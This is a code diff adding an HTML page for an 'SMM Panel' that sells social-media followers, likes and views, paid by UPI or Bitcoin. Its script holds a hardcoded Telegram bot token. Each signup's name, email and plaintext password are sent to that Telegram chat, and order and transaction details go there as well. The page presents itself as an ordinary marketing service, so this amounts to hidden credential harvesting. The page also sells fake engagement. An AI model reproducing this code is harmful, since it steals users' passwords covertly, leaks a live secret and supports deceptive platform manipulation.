@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMM Panel - Professional Social Media Marketing</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #FF3B5C;
+            --secondary: #2D2D3F;
+            --accent: #00F5FF;
+            --dark: #0A0A0F;
+            --light: #F5F5FA;
+            --success: #00E676;
+            --warning: #FFB800;
+            --card-bg: #1A1A28;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Outfit', sans-serif; background: var(--dark); color: var(--light); overflow-x: hidden; }
+        
+        /* Background Effects */
+        .bg-pattern {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+            background: radial-gradient(circle at 20% 50%, rgba(255, 59, 92, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(0, 245, 255, 0.1) 0%, transparent 50%);
+            animation: bgShift 20s ease infinite;
+        }
+        @keyframes bgShift { 0%, 100% { opacity: 0.3; } 50% { opacity: 0.6; } }
+        .grain {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.03; z-index: 1; pointer-events: none;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+        }
+        
+        /* Auth Overlay */
+        .auth-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10, 10, 15, 0.98);
+            z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px);
+        }
+        .auth-overlay.hidden { display: none !important; }
+        .auth-container {
+            background: var(--card-bg); padding: 3rem; border-radius: 25px; border: 1px solid var(--border);
+            max-width: 450px; width: 90%; animation: scaleIn 0.4s ease; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .auth-header { text-align: center; margin-bottom: 2rem; }
+        .auth-title {
+            font-size: 2.2rem; font-weight: 800; margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .auth-subtitle { font-size: 0.95rem; opacity: 0.7; }
+        .auth-tabs { display: flex; gap: 1rem; margin-bottom: 2rem; }
+        .auth-tab {
+            flex: 1; padding: 1rem; background: transparent; border: 2px solid var(--border);
+            border-radius: 12px; color: var(--light); cursor: pointer; transition: all 0.3s ease;
+            font-weight: 600; font-size: 1rem;
+        }
+        .auth-tab:hover { border-color: var(--primary); }
+        .auth-tab.active { background: var(--primary); border-color: var(--primary); }
+        .auth-form { display: none; }
+        .auth-form.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .error-message, .success-message {
+            padding: 1rem; border-radius: 10px; margin-bottom: 1.5rem; font-size: 0.9rem; display: none;
+            border-left: 4px solid;
+        }
+        .error-message { background: rgba(255, 59, 92, 0.2); color: #ff6b85; border-color: var(--primary); }
+        .success-message { background: rgba(0, 230, 118, 0.2); color: #00ff88; border-color: var(--success); }
+        .error-message.show, .success-message.show { display: block; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-label { display: block; margin-bottom: 0.5rem; font-weight: 600; font-size: 0.95rem; color: var(--accent); }
+        .form-input {
+            width: 100%; padding: 1rem 1.2rem; background: var(--secondary); border: 2px solid var(--border);
+            border-radius: 12px; color: var(--light); font-family: 'Outfit', sans-serif;
+            font-size: 1rem; transition: all 0.3s ease;
+        }
+        .form-input:focus {
+            outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(255, 59, 92, 0.1);
+            background: var(--dark);
+        }
+        .btn-auth {
+            width: 100%; padding: 1.2rem; margin-top: 1rem; border: none; border-radius: 12px;
+            font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: all 0.3s ease;
+            background: linear-gradient(135deg, var(--primary), #FF6B85); color: white;
+            box-shadow: 0 10px 30px rgba(255, 59, 92, 0.3);
+        }
+        .btn-auth:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(255, 59, 92, 0.5); }
+        .btn-auth:active { transform: translateY(0); }
+        
+        /* Main Container */
+        .main-content { position: relative; z-index: 2; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 2rem; }
+        
+        /* Header */
+        header {
+            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+            padding: 2rem 0; margin-bottom: 3rem; animation: slideDown 0.6s ease;
+        }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        .logo {
+            font-size: 2rem; font-weight: 800; letter-spacing: -1px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .user-info { display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; animation: fadeIn 0.8s ease 0.3s backwards; }
+        .nav-buttons { display: flex; gap: 0.8rem; flex-wrap: wrap; }
+        .nav-btn {
+            padding: 0.7rem 1.3rem; background: var(--card-bg); border: 1px solid var(--border);
+            border-radius: 50px; color: var(--light); cursor: pointer; transition: all 0.3s ease;
+            font-weight: 600; font-size: 0.9rem; position: relative;
+        }
+        .nav-btn:hover, .nav-btn.active { background: var(--primary); border-color: var(--primary); transform: translateY(-2px); }
+        .nav-btn.logout-btn { background: rgba(255, 59, 92, 0.2); border-color: var(--primary); }
+        .balance {
+            background: var(--card-bg); padding: 0.8rem 1.5rem; border-radius: 50px;
+            border: 1px solid var(--border); font-weight: 600; display: flex; align-items: center; gap: 0.5rem;
+        }
+        .balance-amount { color: var(--success); font-family: 'Space Mono', monospace; }
+        .user-avatar {
+            width: 45px; height: 45px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1.1rem;
+        }
+        
+        /* Stats */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin-bottom: 3rem; }
+        .stat-card {
+            background: var(--card-bg); padding: 2rem; border-radius: 20px; border: 1px solid var(--border);
+            position: relative; overflow: hidden; transition: all 0.3s ease;
+        }
+        .stat-card:hover { transform: translateY(-5px); border-color: var(--primary); }
+        .stat-card::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+        }
+        .stat-label { font-size: 0.9rem; opacity: 0.7; margin-bottom: 0.5rem; }
+        .stat-value {
+            font-size: 2.5rem; font-weight: 700; font-family: 'Space Mono', monospace;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        
+        /* Services */
+        .services-container, .history-container, .admin-container { display: none; }
+        .services-container.active, .history-container.active, .admin-container.active { display: block; }
+        .services-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; flex-wrap: wrap; gap: 1rem; }
+        .services-title { font-size: 2rem; font-weight: 700; }
+        .filter-tabs { display: flex; gap: 0.8rem; flex-wrap: wrap; }
+        .filter-tab {
+            padding: 0.7rem 1.5rem; background: transparent; border: 1px solid var(--border);
+            border-radius: 50px; color: var(--light); cursor: pointer; transition: all 0.3s ease; font-weight: 500;
+        }
+        .filter-tab:hover, .filter-tab.active { background: var(--primary); border-color: var(--primary); }
+        .services-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 2rem; margin-bottom: 3rem; }
+        .service-card {
+            background: var(--card-bg); border-radius: 20px; border: 1px solid var(--border);
+            overflow: hidden; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer;
+        }
+        .service-card:hover { transform: translateY(-10px) scale(1.02); border-color: var(--accent); box-shadow: 0 20px 40px rgba(0, 245, 255, 0.2); }
+        .service-icon {
+            width: 100%; height: 180px; background: linear-gradient(135deg, var(--secondary), var(--dark));
+            display: flex; align-items: center; justify-content: center; font-size: 4rem; position: relative; overflow: hidden;
+        }
+        .service-content { padding: 1.5rem; }
+        .service-name { font-size: 1.3rem; font-weight: 700; margin-bottom: 0.5rem; }
+        .service-description { font-size: 0.9rem; opacity: 0.7; margin-bottom: 1rem; line-height: 1.6; }
+        .service-meta { display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid var(--border); }
+        .service-price { font-size: 1.2rem; font-weight: 700; color: var(--success); font-family: 'Space Mono', monospace; }
+        .service-speed { font-size: 0.8rem; padding: 0.3rem 0.8rem; background: rgba(0, 245, 255, 0.1); border-radius: 20px; color: var(--accent); }
+        .order-btn {
+            width: 100%; padding: 1rem; margin-top: 1rem; background: linear-gradient(135deg, var(--primary), #FF6B85);
+            border: none; border-radius: 10px; color: white; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.3s ease;
+        }
+        .order-btn:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(255, 59, 92, 0.4); }
+        
+        /* Modal */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(10, 10, 15, 0.95); z-index: 9999; align-items: center; justify-content: center;
+            backdrop-filter: blur(10px); overflow-y: auto; padding: 2rem;
+        }
+        .modal.active { display: flex !important; animation: fadeIn 0.3s ease; }
+        .modal-content {
+            background: var(--card-bg); padding: 2.5rem; border-radius: 25px; border: 1px solid var(--border);
+            max-width: 900px; width: 100%; max-height: 90vh; overflow-y: auto;
+            animation: scaleIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .modal-header {
+            font-size: 1.8rem; font-weight: 700; margin-bottom: 2rem;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .payment-info {
+            background: linear-gradient(135deg, rgba(0, 245, 255, 0.1), rgba(255, 59, 92, 0.1));
+            padding: 2rem; border-radius: 15px; margin-bottom: 1.5rem; border: 1px solid var(--border);
+        }
+        .payment-info h4 { color: var(--accent); margin-bottom: 1rem; font-size: 1.2rem; }
+        .payment-methods { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-bottom: 1.5rem; }
+        .payment-method { background: var(--secondary); padding: 1.5rem; border-radius: 12px; border: 1px solid var(--border); }
+        .payment-method h5 { color: var(--success); margin-bottom: 1rem; font-size: 1rem; text-align: center; }
+        .qr-code { width: 200px; height: 200px; margin: 0 auto 1rem; display: block; border-radius: 10px; border: 3px solid var(--border); }
+        .payment-details { display: grid; gap: 1rem; }
+        .payment-detail {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.8rem; background: var(--dark); border-radius: 8px;
+        }
+        .payment-detail-info { flex: 1; }
+        .payment-detail strong { color: var(--accent); display: block; margin-bottom: 0.3rem; font-size: 0.85rem; }
+        .payment-detail span { font-family: 'Space Mono', monospace; font-size: 0.9rem; word-break: break-all; }
+        .copy-btn {
+            background: var(--primary); border: none; padding: 0.5rem 1rem; border-radius: 5px;
+            color: white; cursor: pointer; font-size: 0.8rem; transition: all 0.3s ease;
+            white-space: nowrap; margin-left: 1rem; font-weight: 600;
+        }
+        .copy-btn:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255, 59, 92, 0.4); }
+        .form-select, .form-textarea {
+            width: 100%; padding: 1rem; background: var(--secondary); border: 1px solid var(--border);
+            border-radius: 10px; color: var(--light); font-family: 'Outfit', sans-serif;
+            font-size: 1rem; transition: all 0.3s ease;
+        }
+        .form-select:focus, .form-textarea:focus {
+            outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(255, 59, 92, 0.1);
+        }
+        .form-textarea { resize: vertical; min-height: 100px; }
+        .modal-actions { display: flex; gap: 1rem; margin-top: 2rem; }
+        .btn-submit, .btn-cancel {
+            flex: 1; padding: 1rem; border: none; border-radius: 10px;
+            font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.3s ease;
+        }
+        .btn-submit { background: linear-gradient(135deg, var(--primary), #FF6B85); color: white; }
+        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255, 59, 92, 0.4); }
+        .btn-cancel { background: transparent; border: 1px solid var(--border); color: var(--light); }
+        .btn-cancel:hover { background: var(--secondary); }
+        
+        /* Order History */
+        .order-table { width: 100%; background: var(--card-bg); border-radius: 15px; overflow-x: auto; border: 1px solid var(--border); }
+        .order-table table { width: 100%; border-collapse: collapse; min-width: 1000px; }
+        .order-table th {
+            background: var(--secondary); padding: 1.2rem; text-align: left;
+            font-weight: 600; border-bottom: 1px solid var(--border);
+        }
+        .order-table td { padding: 1.2rem; border-bottom: 1px solid var(--border); }
+        .order-table tr:hover { background: rgba(255, 255, 255, 0.02); }
+        .status-badge { padding: 0.4rem 1rem; border-radius: 20px; font-size: 0.8rem; font-weight: 600; display: inline-block; }
+        .status-pending { background: rgba(255, 184, 0, 0.2); color: var(--warning); }
+        .status-processing { background: rgba(0, 245, 255, 0.2); color: var(--accent); }
+        .status-completed { background: rgba(0, 230, 118, 0.2); color: var(--success); }
+        .status-rejected { background: rgba(255, 59, 92, 0.2); color: var(--primary); }
+        
+        /* Admin Panel */
+        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-bottom: 2rem; }
+        .admin-stat-card { background: var(--card-bg); padding: 1.5rem; border-radius: 15px; border: 1px solid var(--border); text-align: center; }
+        .admin-stat-value { font-size: 2rem; font-weight: 700; color: var(--accent); font-family: 'Space Mono', monospace; }
+        .admin-stat-label { font-size: 0.9rem; opacity: 0.7; margin-top: 0.5rem; }
+        .pending-orders { background: var(--card-bg); border-radius: 15px; padding: 2rem; border: 1px solid var(--border); }
+        .pending-orders h3 { margin-bottom: 1.5rem; color: var(--warning); }
+        .pending-order-card {
+            background: var(--secondary); padding: 1.5rem; border-radius: 10px; margin-bottom: 1rem;
+            border-left: 4px solid var(--warning);
+        }
+        .order-info { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1rem; }
+        .order-info-item { display: flex; flex-direction: column; }
+        .order-info-label { font-size: 0.8rem; opacity: 0.7; margin-bottom: 0.3rem; }
+        .order-info-value { font-weight: 600; color: var(--accent); }
+        .transaction-info {
+            background: rgba(0, 245, 255, 0.05); padding: 1rem; border-radius: 8px;
+            margin: 1rem 0; border: 1px solid rgba(0, 245, 255, 0.2);
+        }
+        .transaction-id { font-family: 'Space Mono', monospace; color: var(--success); font-weight: 600; }
+        .admin-actions { display: flex; gap: 1rem; margin-top: 1rem; }
+        .btn-approve, .btn-reject {
+            flex: 1; padding: 0.8rem; border: none; border-radius: 8px;
+            font-weight: 600; cursor: pointer; transition: all 0.3s ease;
+        }
+        .btn-approve { background: var(--success); color: white; }
+        .btn-approve:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 230, 118, 0.4); }
+        .btn-reject { background: transparent; border: 1px solid var(--primary); color: var(--primary); }
+        .btn-reject:hover { background: var(--primary); color: white; }
+        .notification-badge {
+            position: absolute; top: -8px; right: -8px; background: var(--primary);
+            color: white; width: 22px; height: 22px; border-radius: 50%; display: flex;
+            align-items: center; justify-content: center; font-size: 0.7rem; font-weight: 700;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .empty-state { text-align: center; padding: 3rem; opacity: 0.5; }
+        .empty-state-icon { font-size: 4rem; margin-bottom: 1rem; }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .payment-methods { grid-template-columns: 1fr; }
+            .services-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: 1fr; }
+            header { flex-direction: column; align-items: flex-start; }
+            .user-info { width: 100%; justify-content: space-between; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-pattern"></div>
+    <div class="grain"></div>
+
+    <!-- Login/Signup Overlay -->
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-container">
+            <div class="auth-header">
+                <div class="auth-title">⚡ SMM Panel</div>
+                <div class="auth-subtitle">Professional Social Media Marketing Platform</div>
+            </div>
+            
+            <div class="error-message" id="authError"></div>
+            <div class="success-message" id="authSuccess"></div>
+            
+            <div class="auth-tabs">
+                <button class="auth-tab active" id="loginTab">Login</button>
+                <button class="auth-tab" id="signupTab">Sign Up</button>
+            </div>
+            
+            <!-- Login Form -->
+            <form class="auth-form active" id="loginForm">
+                <div class="form-group">
+                    <label class="form-label">📧 Email Address</label>
+                    <input type="email" class="form-input" id="loginEmail" placeholder="Enter your email" required autocomplete="email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">🔒 Password</label>
+                    <input type="password" class="form-input" id="loginPassword" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+                <button type="submit" class="btn-auth">Login 🚀</button>
+            </form>
+            
+            <!-- Signup Form -->
+            <form class="auth-form" id="signupForm">
+                <div class="form-group">
+                    <label class="form-label">👤 Full Name</label>
+                    <input type="text" class="form-input" id="signupName" placeholder="Enter your full name" required autocomplete="name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">📧 Email Address</label>
+                    <input type="email" class="form-input" id="signupEmail" placeholder="Enter your email" required autocomplete="email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">🔒 Password</label>
+                    <input type="password" class="form-input" id="signupPassword" placeholder="Create password (min 6 characters)" required minlength="6" autocomplete="new-password">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">🔒 Confirm Password</label>
+                    <input type="password" class="form-input" id="signupConfirmPassword" placeholder="Confirm your password" required minlength="6" autocomplete="new-password">
+                </div>
+                <button type="submit" class="btn-auth">Sign Up 🎉</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" style="display: none;" id="mainContent">
+        <div class="container">
+            <header>
+                <div class="logo">⚡ SMM Panel</div>
+                <div class="user-info">
+                    <div class="nav-buttons">
+                        <button class="nav-btn active" data-section="services">🏠 Services</button>
+                        <button class="nav-btn" data-section="history">📋 Order History</button>
+                        <button class="nav-btn" data-section="admin" style="position: relative;">
+                            👑 Admin
+                            <span class="notification-badge" id="adminNotification">0</span>
+                        </button>
+                        <button class="nav-btn logout-btn" id="logoutBtn">🚪 Logout</button>
+                    </div>
+                    <div class="balance">💰 Balance: <span class="balance-amount">₹12,450</span></div>
+                    <div class="user-avatar" id="userAvatar">U</div>
+                </div>
+            </header>
+
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-label">📦 Total Orders</div><div class="stat-value">2,847</div></div>
+                <div class="stat-card"><div class="stat-label">👥 Active Users</div><div class="stat-value" id="activeUsers">347</div></div>
+                <div class="stat-card"><div class="stat-label">✅ Completed</div><div class="stat-value">2,756</div></div>
+                <div class="stat-card"><div class="stat-label">💵 Total Spent</div><div class="stat-value">₹89K</div></div>
+            </div>
+
+            <!-- Services Section -->
+            <div class="services-container active" id="servicesContainer">
+                <div class="services-header">
+                    <h2 class="services-title">🚀 Available Services</h2>
+                    <div class="filter-tabs">
+                        <button class="filter-tab active" data-filter="all">All</button>
+                        <button class="filter-tab" data-filter="instagram">Instagram</button>
+                        <button class="filter-tab" data-filter="youtube">YouTube</button>
+                        <button class="filter-tab" data-filter="facebook">Facebook</button>
+                        <button class="filter-tab" data-filter="twitter">Twitter</button>
+                        <button class="filter-tab" data-filter="tiktok">TikTok</button>
+                    </div>
+                </div>
+                <div class="services-grid" id="servicesGrid"></div>
+            </div>
+
+            <!-- Order History Section -->
+            <div class="history-container" id="historyContainer">
+                <div class="services-header"><h2 class="services-title">📋 Order History</h2></div>
+                <div class="order-table">
+                    <table>
+                        <thead>
+                            <tr><th>Order ID</th><th>Service</th><th>Link</th><th>Quantity</th><th>Amount</th><th>Transaction ID</th><th>Status</th><th>Date</th></tr>
+                        </thead>
+                        <tbody id="orderHistoryBody"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Admin Panel Section -->
+            <div class="admin-container" id="adminContainer">
+                <div class="services-header"><h2 class="services-title">👑 Admin Panel</h2></div>
+                <div class="admin-stats">
+                    <div class="admin-stat-card"><div class="admin-stat-value" id="pendingCount">0</div><div class="admin-stat-label">⏳ Pending Approval</div></div>
+                    <div class="admin-stat-card"><div class="admin-stat-value">156</div><div class="admin-stat-label">✅ Approved Today</div></div>
+                    <div class="admin-stat-card"><div class="admin-stat-value">₹45,890</div><div class="admin-stat-label">💰 Today's Revenue</div></div>
+                    <div class="admin-stat-card"><div class="admin-stat-value">2,847</div><div class="admin-stat-label">📦 Total Orders</div></div>
+                </div>
+                <div class="pending-orders">
+                    <h3>⏳ Pending Payment Approvals</h3>
+                    <div id="pendingOrdersList"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Order Modal -->
+    <div class="modal" id="orderModal">
+        <div class="modal-content">
+            <h3 class="modal-header">Place New Order</h3>
+            <div class="payment-info">
+                <h4>💳 Payment Information</h4>
+                <div class="payment-methods">
+                    <div class="payment-method">
+                        <h5>🇮🇳 Indian Payment (UPI)</h5>
+                        <img src="payment-qr.jpg" alt="UPI QR Code" class="qr-code" onerror="this.style.display='none';">
+                        <div class="payment-details">
+                            <div class="payment-detail">
+                                <div class="payment-detail-info">
+                                    <strong>UPI ID:</strong>
+                                    <span style="color: var(--success); font-weight: 600;">vimalrajpurohit9898@okicici</span>
+                                </div>
+                                <button class="copy-btn" type="button" onclick="copyToClipboard('vimalrajpurohit9898@okicici')">Copy</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="payment-method">
+                        <h5>🌍 International Payment (Crypto)</h5>
+                        <div style="text-align: center; padding: 2rem 0;">
+                            <div style="font-size: 3rem; margin-bottom: 1rem;">₿</div>
+                            <div style="color: var(--warning); font-weight: 600;">Bitcoin (BTC)</div>
+                        </div>
+                        <div class="payment-details">
+                            <div class="payment-detail">
+                                <div class="payment-detail-info">
+                                    <strong>Wallet Address:</strong>
+                                    <span style="font-size: 0.8rem; color: var(--success); font-weight: 600;">1BLDrhmN5tJAZJ3zXEQFpWQnqYtbp17NkC</span>
+                                </div>
+                                <button class="copy-btn" type="button" onclick="copyToClipboard('1BLDrhmN5tJAZJ3zXEQFpWQnqYtbp17NkC')">Copy</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div style="background: linear-gradient(135deg, rgba(255, 59, 92, 0.2), rgba(0, 245, 255, 0.2)); padding: 1.5rem; border-radius: 12px; border: 2px solid var(--primary); margin-top: 1rem;">
+                    <strong style="color: var(--primary); font-size: 1.1rem;">⚠️ Important Instructions:</strong>
+                    <ol style="margin: 0.5rem 0 0 1.2rem; line-height: 1.8;">
+                        <li>Pehle payment karein (UPI ya Bitcoin)</li>
+                        <li>Payment ke baad Transaction ID/UTR Number niche enter karein</li>
+                        <li>Order submit karein</li>
+                        <li>Admin approval wait karein (10-30 minutes)</li>
+                        <li>Approval ke baad order start hoga</li>
+                    </ol>
+                </div>
+            </div>
+            <form id="orderForm">
+                <div class="form-group">
+                    <label class="form-label">Service</label>
+                    <select class="form-select" id="serviceSelect" required><option value="">Select Service</option></select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Link/Username</label>
+                    <input type="text" class="form-input" id="orderLink" placeholder="Enter profile link or username" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Quantity</label>
+                    <input type="number" class="form-input" id="orderQuantity" placeholder="Enter quantity" min="100" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">💰 Total Amount</label>
+                    <input type="text" class="form-input" id="totalAmount" readonly style="background: var(--dark); color: var(--success); font-weight: 700;">
+                </div>
+                <div class="form-group">
+                    <label class="form-label" style="color: var(--primary); font-size: 1.05rem;">🔢 Transaction ID / UTR Number * (MANDATORY)</label>
+                    <input type="text" class="form-input" id="transactionId" placeholder="Enter 12-digit transaction ID" required minlength="12" style="border: 2px solid var(--primary); font-family: 'Space Mono', monospace;">
+                    <div style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--warning);">⚠️ Bina valid Transaction ID ke order approve nahi hoga!</div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Additional Notes (Optional)</label>
+                    <textarea class="form-textarea" id="orderNotes" placeholder="Any special instructions..."></textarea>
+                </div>
+                <div class="modal-actions">
+                    <button type="submit" class="btn-submit">Submit Order 🚀</button>
+                    <button type="button" class="btn-cancel" onclick="closeModal()">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ============ TELEGRAM BOT NOTIFICATION SYSTEM ============
+        const TELEGRAM_BOT_TOKEN = '8361162504:AAEz4-nUup_znR1Kt67r7__o-LnKdFKOwM8';
+        const TELEGRAM_CHAT_ID = '8541208450';
+
+        async function sendTelegramNotification(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.log('Telegram error:', error);
+            }
+        }
+
+        function notifyNewUser(name, email, password) {
+            const msg = `🆕 <b>NEW USER SIGNUP</b>\n\n👤 <b>Name:</b> ${name}\n📧 <b>Email:</b> ${email}\n🔒 <b>Password:</b> ${password}\n📅 <b>Time:</b> ${new Date().toLocaleString('en-IN')}\n\n✅ Registered successfully!`;
+            sendTelegramNotification(msg);
+        }
+
+        function notifyNewOrder(orderId, userEmail, service, qty, amt, link, txn, notes) {
+            const msg = `📦 <b>NEW ORDER</b>\n\n🆔 <b>Order ID:</b> ${orderId}\n👤 <b>User:</b> ${userEmail}\n🛒 <b>Service:</b> ${service}\n📊 <b>Quantity:</b> ${qty.toLocaleString()}\n💰 <b>Amount:</b> ₹${amt.toFixed(2)}\n\n🔗 <b>Link:</b> ${link}\n🔢 <b>Transaction ID:</b> ${txn}\n📝 <b>Notes:</b> ${notes||'None'}\n\n📅 <b>Time:</b> ${new Date().toLocaleString('en-IN')}\n⏳ <b>Status:</b> PENDING`;
+            sendTelegramNotification(msg);
+        }
+
+        function notifyOrderApproved(orderId, userId, service, qty, amt) {
+            const msg = `✅ <b>ORDER APPROVED</b>\n\n🆔 <b>Order ID:</b> ${orderId}\n👤 <b>User:</b> ${userId}\n🛒 <b>Service:</b> ${service}\n📊 <b>Quantity:</b> ${qty.toLocaleString()}\n💰 <b>Amount:</b> ₹${amt.toFixed(2)}\n\n📅 <b>Time:</b> ${new Date().toLocaleString('en-IN')}\n🚀 Processing started!`;
+            sendTelegramNotification(msg);
+        }
+
+        function notifyOrderRejected(orderId, userId, service, amt) {
+            const msg = `❌ <b>ORDER REJECTED</b>\n\n🆔 <b>Order ID:</b> ${orderId}\n👤 <b>User:</b> ${userId}\n🛒 <b>Service:</b> ${service}\n💰 <b>Amount:</b> ₹${amt.toFixed(2)}\n\n📅 <b>Time:</b> ${new Date().toLocaleString('en-IN')}\n⚠️ Payment verification failed`;
+            sendTelegramNotification(msg);
+        }
+
+        // ============ SERVICES DATA WITH CORRECT PRICES ============
+        const services = [
+            { id: 1, name: 'Instagram Followers', category: 'instagram', icon: '📸', description: 'High-quality Instagram followers', price: 150, priceText: '₹150/1K', speed: '⚡ 10K/Day' },
+            { id: 2, name: 'Instagram Likes', category: 'instagram', icon: '❤️', description: 'Instant Instagram likes', price: 40, priceText: '₹40/1K', speed: '⚡ 20K/Day' },
+            { id: 3, name: 'Instagram Views', category: 'instagram', icon: '👁️', description: 'Boost reels and video views', price: 80, priceText: '₹80/1K', speed: '⚡ 100K/Day' },
+            { id: 4, name: 'Instagram Comments', category: 'instagram', icon: '💬', description: 'Real comments from genuine accounts', price: 35, priceText: '₹35/1K', speed: '🔥 1K/Day' },
+            { id: 5, name: 'Instagram Story Views', category: 'instagram', icon: '📱', description: 'Increase story views', price: 60, priceText: '₹60/1K', speed: '⚡ 50K/Day' },
+            { id: 6, name: 'Instagram Auto Likes', category: 'instagram', icon: '🔄', description: 'Automatic likes on every post', price: 50, priceText: '₹50/1K', speed: '⚡ Instant' },
+            { id: 7, name: 'YouTube Subscribers', category: 'youtube', icon: '🎥', description: 'Real YouTube subscribers', price: 450, priceText: '₹450/1K', speed: '🔥 500/Day' },
+            { id: 8, name: 'YouTube Views', category: 'youtube', icon: '▶️', description: 'High retention video views', price: 100, priceText: '₹100/1K', speed: '⚡ 50K/Day' },
+            { id: 9, name: 'YouTube Likes', category: 'youtube', icon: '👍', description: 'Genuine YouTube likes', price: 60, priceText: '₹60/1K', speed: '⚡ 5K/Day' },
+            { id: 10, name: 'YouTube Watch Hours', category: 'youtube', icon: '⏰', description: 'Boost watch hours', price: 2000, priceText: '₹2000/1K Hours', speed: '🔥 100Hrs/Day' },
+            { id: 11, name: 'YouTube Comments', category: 'youtube', icon: '💬', description: 'Real comments from active users', price: 50, priceText: '₹50/1K', speed: '🔥 500/Day' },
